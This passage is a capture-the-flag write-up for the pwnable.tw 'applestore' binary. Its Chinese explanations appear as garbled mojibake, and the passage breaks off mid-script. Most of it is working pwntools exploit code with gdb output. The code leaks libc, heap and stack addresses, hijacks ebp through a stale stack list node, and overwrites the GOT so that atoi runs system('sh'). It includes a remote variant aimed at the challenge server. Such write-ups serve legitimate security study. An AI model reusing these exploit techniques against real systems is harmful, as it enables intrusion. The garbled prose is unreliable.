499ã€‚é‚£ä¹ˆæ€ä¹ˆæ­é…è¿™å››ç§ä»·æ ¼å‡‘é½7174ç¾å…ƒï¼Œå°±éœ€è¦ä½¿ç”¨å„è‡ªçš„æ–¹æ³•äº†ã€‚è¿™é‡Œæä¾›å‡ ç§é€”å¾„ï¼š\n\n- Z3æ±‚è§£å™¨\n- matlab\n- wolf mathematics\n- é å„ä½çš„æ™ºåŠ›è„‘ç®—+æ‰‹ç®—...\n\nè¿™é‡Œå€Ÿç”¨ä¸€ä¸‹æˆ‘ç”·ç¥¨ç®—åˆ°çš„ç»“æœï¼š6 * 199 + 20 * 299 = 7174\n\nè§¦å‘è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('>',op)\n    myps.sendlineafter('>',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\nmyps.recv()\nmyps.interactive()\n```\n\næ‰§è¡Œè¯¥è„šæœ¬ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œè¿›å…¥äº†1ç¾å…ƒä¹°iphone8çš„åˆ†æ”¯ï¼š\n\n```shell\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n*: iPhone 8 - $1\nTotal: $7175\nWant to checkout? Maybe next time!\n> $  \n```\n\næ­¤æ—¶ï¼Œç¨‹åºå›åˆ°äº†handleråˆ†æ”¯ï¼Œcheckoutçš„å‡½æ•°æ ˆå·²ç»è¢«é‡Šæ”¾ï¼Œå› æ­¤iphone 8çš„æ ˆç©ºé—´æ¥ä¸‹æ¥å¯èƒ½å­˜åœ¨ä¸¤ç§å¯èƒ½ï¼š\n\n- 1ã€è¿™æ®µæ ˆç©ºé—´çš„å€¼æ²¡è¢«è¦†ç›–ï¼Œé‚£ä¹ˆiphone 8 çš„æ ˆå—ä¿¡æ¯æ˜¯è¿˜åœ¨çš„ï¼Œæ­¤æ—¶æŸ¥çœ‹é“¾è¡¨æˆ–è€…åˆ é™¤é“¾è¡¨ä¸­è¯¥é¡¹ä¹Ÿè®¸ä¸ä¼šæœ‰é—®é¢˜ã€‚ï¼ˆæ²¡æœ‰å°è¯•ï¼‰\n- 2ã€è¿™æ®µæ ˆç©ºé—´è¢«åˆ†é…ç»™äº†æ–°å‡½æ•°ï¼Œå¹¶ä¸”æ–°å‡½æ•°è¦†ç›–ä¸Šäº†æ–°å€¼ã€‚é‚£ä¹ˆæ­¤æ—¶å¯¹æ•´ä¸ªé“¾è¡¨è¿›è¡ŒæŸ¥çœ‹æˆ–åˆ é™¤iphone 8è¿™ä¸€é¡¹æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚\n\næˆ‘ä»¬æ‰§è¡Œ4ï¼ˆcartæŸ¥çœ‹è´­ç‰©è½¦ï¼‰ï¼Œç­‰äºå°†åˆšåˆšchekoutçš„æ ˆåˆ†é…ç»™äº†cartå‡½æ•°ã€‚é‚£ä¹ˆå°±ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼ˆå¦‚æœä½¿ç”¨deleteåˆ é™¤æœ€åä¸€é¡¹ï¼Œä¹Ÿä¼šå‡ºé”™ï¼‰ï¼š\n\n```shell\nTotal: $7175\nWant to checkout? Maybe next time!\n> $ 4\n[DEBUG] Sent 0x2 bytes:\n    '4\\n'\n[DEBUG] Received 0x24 bytes:\n    'Let me check your cart. ok? (y/n) > '\nLet me check your cart. ok? (y/n) > $ y\nÂ·Â·Â·Â·Â·Â·\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n27: ï¿½f\\x89p\\x0c\\x89x\\x0e\\x05- $-136495008\n[*] Got EOF while reading in interactive\n$  \n```\n\nå‡ºé”™çš„åŸå› æ˜¯ï¼Œiphone8ç›¸å…³çš„æ•°æ®éƒ½å­˜åœ¨æ ˆä¸Šï¼Œåœ¨checkoutå‡½æ•°é€€å‡ºåï¼Œæ ˆä¸Šçš„æ•°æ®è¢«cartå‡½æ•°çš„å±€éƒ¨å˜é‡è¦†ç›–ã€‚å¯¼è‡´cartä¸­éå†è®¿é—®é“¾è¡¨æ—¶ï¼Œè®¿é—®åˆ°iphone 8æ—¶è®¿é—®äº†éæ³•çš„åœ°å€ã€‚\n\n# 2 åˆ©ç”¨\n\n1.2.5èŠ‚æ¼æ´ç‚¹ä¸­é˜è¿°äº†è¿™ä¸ªæ¼æ´å¯ä»¥ç”¨æ¥æ³„éœ²ä¿¡æ¯ä»¥åŠæœ‰çº¦æŸåœ°å†™ã€‚\n\n- 1ã€å¦‚æœæˆ‘ä»¬æŠŠiphone 8æ•°æ®æ‰€åœ¨çš„æ ˆç©ºé—´è¦†ç›–ä¸ºæ„é€ çš„ç‰¹å®šæ•°æ®ï¼Œå°±å¯ä»¥æ‰“å°ï¼ˆæ³„éœ²ï¼‰æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚æ¯”å¦‚è¯´libcã€‚ï¼ˆåé¢éœ€è¦ç”¨åˆ°å †åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€æ³„éœ²å †ã€ä»¥åŠæ ˆç©ºé—´çš„åœ°å€ï¼‰\n- 2ã€æœ‰çº¦æŸåœ°å†™ï¼Œç”±äºgotè¡¨å¯å†™ï¼Œå› æ­¤æˆ‘ä»¬ä¸€å®šæ˜¯åˆ©ç”¨è¿™ä¸ªä»»æ„åœ°å€å†™å»è¦†å†™gotè¡¨é¡¹ã€‚\n\n## 2.1 ä¿¡æ¯æ³„éœ²- cart\n\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç²¾å¿ƒå¸ƒç½®cartå‡½æ•°çš„æ ˆå¸§ï¼Œæ§åˆ¶ebp-0x20å¤„è¿ç»­16ä¸ªå­—èŠ‚çš„å€¼ï¼ˆåœ¨IDAä¸­æŸ¥çœ‹cartå‡½æ•°çš„ä¼ªç å¯çŸ¥ï¼Œebp-0x20 ~ ebp-0x10ç©ºé—´æ˜¯è¾“å…¥bufï¼Œå¯æ§ï¼‰ã€‚å¦‚å›¾ä¸­çº¢è‰²æ ˆå—æ‰€ç¤ºï¼Œcartå‡½æ•°æ‰“å°åˆ°æ ˆä¸Šçš„å—æ—¶ï¼Œä¼šå°†gotè¡¨ä¸­putså‡½æ•°çš„åœ°å€æ‰“å°å‡ºæ¥ã€‚å¹¶ä¸”ç”±äºfdä¸ä¸ºç©ºï¼Œä¼šç»§ç»­ä»¥mycartåç§»8å­—èŠ‚å¤„ä½œä¸ºä¸€ä¸ªæ–°å—ï¼Œå»æ‰“å°info_locçš„åœ°å€ï¼Œæ­¤æ—¶å°±å°†å †çš„åœ°å€æ³„éœ²å‡ºæ¥äº†ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åƒæ³„éœ²putsåœ°å€ä¸€æ ·ï¼Œå»æ³„éœ²å †åœ°å€ï¼‰ã€‚\n\nåˆ©ç”¨æ³„éœ²putså‡½æ•°åœ°å€çš„æ–¹æ³•ï¼Œå¯ä»¥é€æ­¥æ³„éœ²å…¶ä»–ä¿¡æ¯ã€‚\n\n![](applestore-5.png)\n\n### 2.1.1 æ³„éœ²libcå’Œå †åœ°å€\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4))\n##ä¿®æ­£heapåœ°å€\n#heap_addr = u32(myps.recv(44)) - 0x490\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\næ‰“å°å‡ºçš„ä¸¤ä¸ªåœ°å€å¦‚ä¸‹ï¼š\n\n```shell\n[!] libc_addr:0xf7d5a000\n[!] heap_addr:0x830c490\n```\n\nåœ¨æ‰§è¡Œè„šæœ¬è¿‡ç¨‹ä¸­å¼¹å‡ºçš„gdbè°ƒè¯•ç»ˆç«¯æ¡†ä¸­ï¼Œæ‰§è¡Œvmmapï¼ŒæŸ¥çœ‹libcçš„èµ·å§‹åœ°å€ä¸º0xf7d5a000ã€‚ä½¿ç”¨heap chunksæŸ¥çœ‹ç¬¬ä¸€ä¸ªå †çš„åœ°å€ï¼ˆ0x830c008 - 0x8 = 0x830c000ï¼‰ï¼Œå¹¶å¯¹ä¸Šè¿°æ‰“å°çš„å †åœ°å€ä¿®æ­£ï¼ˆ0x830c000 = 0x830c490 - 0x490ï¼Œå·²æ›´æ”¹åˆ°ä¸Šè¿°ä»£ç ä¸­ï¼‰ï¼š\n\n```bash\ngefâ¤  vmmap\nStart      End        Offset     Perm Path\n0xf7d5a000 0xf7f07000 0x00000000 r-x /lib32/libc-2.23.so\n0xf7f07000 0xf7f08000 0x001ad000 --- /lib32/libc-2.23.so\n0xf7f08000 0xf7f0a000 0x001ad000 r-- /lib32/libc-2.23.so\n0xf7f0a000 0xf7f0b000 0x001af000 rw- /lib32/libc-2.23.so\n\ngefâ¤  heap chunks\nChunk(addr=0x830c008, size=0x408, flags=PREV_INUSE)\n    [0x0830c008     3e 20 3a 20 90 c4 30 08 c7 20 2d 20 24 30 0a 08    > : ..0.. - $0..]\nChunk(addr=0x830c410, size=0x18, flags=PREV_INUSE)\n    [0x0830c410     90 c4 30 08 c7 00 00 00 28 c4 30 08 68 b0 04 08    ..0.....(.0.h...]\nChunk(addr=0x830c428, size=0x18, flags=PREV_INUSE)\n    [0x0830c428     40 c4 30 08 c7 00 00 00 50 c4 30 08 10 c4 30 08    @.0.....P.0...0.]\nChunk(addr=0x830c440, size=0x10, flags=PREV_INUSE)\n    [0x0830c440     69 50 68 6f 6e 65 20 36 00 00 00 00 19 00 00 00    iPhone 6........]\n```\n\n### 2.1.2 æ³„éœ²æ ˆåœ°å€\n\nç¬¬26ä¸ªèŠ‚ç‚¹çš„fdä¸­å­˜æ”¾çš„æ˜¯ç¬¬27ä¸ªèŠ‚ç‚¹çš„åœ°å€ï¼ˆå³æ ˆä¸­æŸä¸ªåœ°å€ï¼‰ã€‚\n\næ¥ç€åœ¨1.3.1èŠ‚ä¸­å¼¹å‡ºçš„gdbè°ƒè¯•æ¡†ä¸­ï¼Œæ‰“å°espå’Œebpçš„å€¼ï¼Œåˆ†åˆ«ä¸º0xfffd4038å’Œ0xfffd4078ã€‚ç”±æ­¤æˆ‘ä»¬æ¨æµ‹æ ˆç©ºé—´çš„åœ°å€åº”è¯¥æ˜¯ç”±0xfffdå¼€å¤´çš„ï¼Œç„¶åå»æ‰“å°å‡ºçš„å †chunksä¸­å¯»æ‰¾\"fd ff\"å­—æ ·ã€‚ä»…åœ¨addr=0x830c8a8çš„chunkä¸­æ‰¾åˆ°ä¸€ä¸ª\"0xfffd4058\"ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ ˆç©ºé—´çš„åœ°å€ã€‚é‚£ä¹ˆè¯¥åœ°å€å€¼è·ç¦»å †èµ·å§‹åœ°å€çš„åç§»æ˜¯0x830c8a8 + 0x8 - 0x830c000 = 0x8b0ï¼š\n\n```shell\nChunk(addr=0x830c890, size=0x18, flags=PREV_INUSE)\n    [0x0830c890     10 c9 30 08 2b 01 00 00 a8 c8 30 08 40 c8 30 08    ..0.+.....0.@.0.]\nChunk(addr=0x830c8a8, size=0x18, flags=PREV_INUSE)\n    [0x0830c8a8     c0 c8 30 08 2b 01 00 00 58 40 fd ff 90 c8 30 08    ..0.+...X@....0.]\nChunk(addr=0x830c8c0, size=0x18, flags=PREV_INUSE)\n    [0x0830c8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c8d8, size=0x10, flags=PREV_INUSE)\n    [0x0830c8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x830c8e8, size=0x28, flags=PREV_INUSE)\n    [0x0830c8e8     b0 a7 f0 f7 b0 a7 f0 f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x830c910, size=0x18, flags=)\n    [0x0830c910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c928, size=0x206e0, flags=PREV_INUSE)  â†  top chunk\ngefâ¤  p $esp\n$1 = (void *) 0xfffd4038\ngefâ¤  p $ebp\n$2 = (void *) 0xfffd4078\n```\n\nç”±ä¸Šè¿°å†…å®¹å¯çŸ¥ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ ˆç©ºé—´åœ°å€åœ¨å †èµ·å§‹åœ°å€heap_addr+0x8b0å¤„ã€‚å› æ­¤åœ¨2.1.1çš„pythonä»£ç ä¸­å†æ·»åŠ ä¸€æ­¥ï¼Œå°±å¯ä»¥æ³„éœ²æ ˆç©ºé—´åœ°å€ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\nå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š\n\n```shell\n[!] libc_addr:0xf7d48000\n[!] heap_addr:0x9603000\n[!] satck_addr:0xffb3e518\n===========================================================\nChunk(addr=0x9603890, size=0x18, flags=PREV_INUSE)\n    [0x09603890     10 39 60 09 2b 01 00 00 a8 38 60 09 40 38 60 09    .9`.+....8`.@8`.]\nChunk(addr=0x96038a8, size=0x18, flags=PREV_INUSE)\n    [0x096038a8     c0 38 60 09 2b 01 00 00 18 e5 b3 ff 90 38 60 09    .8`.+........8`.]\nChunk(addr=0x96038c0, size=0x18, flags=PREV_INUSE)\n    [0x096038c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x96038d8, size=0x10, flags=PREV_INUSE)\n    [0x096038d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x96038e8, size=0x28, flags=PREV_INUSE)\n    [0x096038e8     b0 87 ef f7 b0 87 ef f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x9603910, size=0x18, flags=)\n    [0x09603910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x9603928, size=0x206e0, flags=PREV_INUSE)  â†  top chunk\ngefâ¤  p $esp\n$1 = (void *) 0xffb3e4f8\ngefâ¤  p $ebp\n$2 = (void *) 0xffb3e538\n```\n\n## 2.2 ä»»æ„åœ°å€å†™ - delete\n\nä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œå‡å¦‚æˆ‘ä»¬è¦åˆ é™¤info_loc_1è¿™ä¸ªå †å—ï¼Œåˆ™å¿…é¡»æ‰§è¡Œå¦‚ä¸‹å‡ æ¡å‘½ä»¤ï¼Œå°†å…¶ä»é“¾è¡¨ä¸­æ‹†é™¤ï¼š\n\n```c\ninfo_loc_2.bk = info_loc_1.bk\ninfo_loc.fd = info_loc_1.fd\n```\n\nå¦‚æœåªç”¨å½“å‰è¦è¢«åˆ é™¤çš„é¡¹info_loc_1æ¥è¡¨ç¤ºï¼Œç›¸å½“äºï¼š\n\n```c\ninfo_loc_1.fd[3] = info_loc_1.bk\ninfo_loc_a.bk[2] = info_loc_1.fd\n//ç®€å†™ä¸º:\nfd[3] = bk\nbk[2] = fd\n```\n\n![](applestore-6.png)\n\nå¦‚ä¸‹å›¾ï¼Œå¯ä»¥å½¢è±¡åœ°æè¿°ä»»æ„åœ°å€å†™çš„ä¸¤ç§æƒ…å†µï¼Œå®é™…åˆ©ç”¨ä½¿é€‰æ‹©ä»»ä½•ä¸€ç§éƒ½å¯ã€‚\n\n![](applestore-7.png)\n\n### 2.2.1 æ³„éœ²ebpåœ°å€\n\nä¸‹é¢éªŒè¯ä¸€ä¸‹handlerä¸‹çš„å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶ï¼Œå…¶ebpæ˜¯ä¸€æ ·çš„ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\nlog.warn('ebp_addr:0x%x' % ebp_addr)\n\ngdb.attach(myps,'b * 0x080489C0 \\nc \\np $ebp')\nmysend(delete,'3')\n\nmyps.interactive()\n```\n\nå¦‚ä¸‹å›¾ï¼Œå‘ç°ebpåœ°å€å¯¹å¾—ä¸Šï¼Œè¯´æ˜deleteå‡½æ•°ä¸­çš„ebpç¡®å®è·Ÿä¹‹å‰å‡½æ•°çš„ebpæ˜¯ä¸€è‡´çš„ï¼š\n\n```shell\n[!] libc_addr:0xf7d5f000\n[!] heap_addr:0x8c89000\n[!] satck_addr:0xffa9f2d8\n[!] ebp_addr:0xffa9f2f8\n=========================================================\n[#0] 0x80489c0 â†’ delete()\n[#1] 0x8048c46 â†’ handler()\n[#2] 0x8048cf5 â†’ main()\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n$1 = (void *) 0xffa9f2f8\ngefâ¤  \n```\n\n### 2.2.2 åŠ«æŒebpåˆ°gotè¡¨\n\næ³„éœ²å®Œebpåœ°å€åï¼Œå°±å¯ä»¥åˆ©ç”¨deleteå‡½æ•°å»æ›´æ”¹æ ˆç©ºé—´ä¸­å­˜æ”¾çš„old ebpï¼Œä»è€Œä½¿å‡½æ•°é€€å‡ºæ—¶ï¼Œå®ç°ebpåŠ«æŒã€‚\n\nåŠ«æŒåˆ°å“ªå„¿å‘¢ï¼Ÿå½“ç„¶æ˜¯gotè¡¨å•¦ï¼é€šè¿‡IDAæŸ¥çœ‹è¯¥äºŒè¿›åˆ¶ç¨‹åºä¸­gotè¡¨çš„åœ°å€æ˜¯0x0804B000è‡³0x0804B040ï¼Œå› æ­¤gotè¡¨åº•éƒ¨ä¸º0x0804B044ã€‚\n\nå°†ebpåŠ«æŒåˆ°gotè¡¨åº•éƒ¨çš„éªŒè¯ä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\ngdb.attach(myps,'b * 0x08048A6F \\nc \\np $ebp')\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(0x0804B044)\nmysend(delete,payload)\n\nmyps.interactive()\n```\n\nåœ¨gdbçª—å£ä¸­ï¼ŒéªŒè¯old ebpç¡®å®è¢«æ›¿æ¢æˆäº†æˆ‘ä»¬æƒ³è¦çš„0x0804B044ï¼ˆgotè¡¨å°¾åœ°å€ï¼‰ã€‚\n\n```shell\ngefâ¤  p $ebp\n$1 = (void *) 0xffba66e8\ngefâ¤  p $esp\n$2 = (void *) 0xffba66a0\ngefâ¤  x/20wx 0xffba66e8\n0xffba66e8:\t0x0804b044\t0x08048c46\t0xffba6706\t0x00000015\n0xffba66f8:\t0xffba6718\t0xf7e26020\t0x00000003\t0x0a333918\n0xffba6708:\t0xf7e26000\t0x080486f7\t0x08048e23\t0x00000006\n0xffba6718:\t0xffba6774\t0x87bfaa00\t0xf7f8edbc\t0xf7f001e5\n0xffba6728:\t0xffba6748\t0x08048cf5\t0x0804b068\t0x00000000\ngefâ¤  x/20wx 0xffba66a0\n0xffba66a0:\t0x08048f98\t0x00000004\t0x0804b028\t0x00000000\n0xffba66b0:\t0x00000004\t0xffba66c8\t0x00000004\t0xffba66dc\n0xffba66c0:\t0x0804b044\t0x00346706\t0x0804b028\t0x00000001\n0xffba66d0:\t0xffba66dc\t0x0804b044\t0x0000000a\t0x87bfaa00\n0xffba66e0:\t0xf7f8d000\t0xf7f8d000\t0x0804b044\t0x08048c46\n```\n\n### 2.2.3 åŠ«æŒebpå¹¶è¦†å†™gotè¡¨\n\nä¸Šè¿°å°†ebpåŠ«æŒåˆ°gotè¡¨å°¾åï¼Œç¨‹åºå›åˆ°äº†handlerä¸­ï¼Œå‡½æ•°å¦‚ä¸‹ã€‚å¯ä»¥çœ‹åˆ°which_phoneå˜é‡åœ¨ebp-0x22å¤„ï¼ˆæ­¤æ—¶ebp-0x22æ­£å¥½åœ¨gotè¡¨ä¸­ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡which_phoneçš„è¾“å…¥å»æ›´æ”¹gotè¡¨ä¸­çš„å†…å®¹ã€‚\n\nå¦‚æœæˆ‘ä»¬èƒ½æŠŠatoiæ”¹æˆsystemï¼Œå¹¶ä¸”æŠŠwhich_phoneçš„å†…å®¹æ”¹æˆ\"sh\"ï¼Œé‚£ä¹ˆå°±èƒ½åœ¨atoi(&which_phone)æ—¶è·å¾—shellã€‚\n\n```c\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    { Â·Â·Â·Â·Â·Â·\n```\n\ngotè¡¨æœ€åå‡ é¡¹å†…å®¹ï¼š\n\n```assembly\n.got.plt:0804B030 9C B0 04 08                   off_804B030     dd offset exit          ; DATA XREF: _exitâ†‘r\n.got.plt:0804B034 A0 B0 04 08                   off_804B034     dd offset __libc_start_main\n.got.plt:0804B034                                                                       ; DATA XREF: ___libc_start_mainâ†‘r\n.got.plt:0804B038 A4 B0 04 08                   off_804B038     dd offset memset        ; DATA XREF: _memsetâ†‘r\n.got.plt:0804B03C A8 B0 04 08                   off_804B03C     dd offset asprintf      ; DATA XREF: _asprintfâ†‘r\n.got.plt:0804B040 AC B0 04 08                   off_804B040     dd offset atoi          ; DATA XREF: _atoiâ†‘r\n.got.plt:0804B040                               _got_plt        ends\n.got.plt:0804B040\n.data:0804B044                               ; =======================================================\n```\n\natoiå‡½æ•°æ˜¯gotè¡¨ä¸­æœ€åä¸€é¡¹ï¼Œå®ƒçš„ä¸Šä¸€é¡¹æ˜¯asprintfã€‚,ä»¤asprintfçš„åœ°å€ä¸ºebp-0x22ï¼Œåˆ™æ„é€ which_phoneä¸º\"sh\\x00\\x00\" + (mylibc.symbols['system'] + libc_addr)ï¼Œå°±å¯ä»¥å°†asprintfå’Œatoiè¡¨é¡¹åˆ†åˆ«è¦†ç›–ä¸º\"sh\\x00\\x00\"å’Œ\"systemå‡½æ•°\"ã€‚å› æ­¤å½“æ‰§è¡Œswitchæ‹¬å·ä¸­çš„atoi(&which_phone)æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œäº†system(\"sh\")ã€‚\n\nè·Ÿ2.2.2ä¸­åŠ«æŒebpåˆ°gotè¡¨çš„ä½ç½®ä¸åŒï¼Œè¿™é‡Œéœ€å°†ebpåŠ«æŒåˆ°myelf.got['asprintf']+0x22ï¼Œæ‰èƒ½ä½¿å…¶æ»¡è¶³ä¸Šè¿°æ¡ä»¶ã€‚\n\nå› æ­¤payloadä¸ºï¼š\n\n```python\npayload = \"2\\x00\" + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr - 0xc) + p32(myelf.got['asprintf']+0x22)\n```\n\n# 3 EXP\n\n## 3.1 æœ¬åœ°\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n## 3.2 è¿œç¨‹\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('../libc_32.so.6')\nmyps = remote('chall.pwnable.tw',10104)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 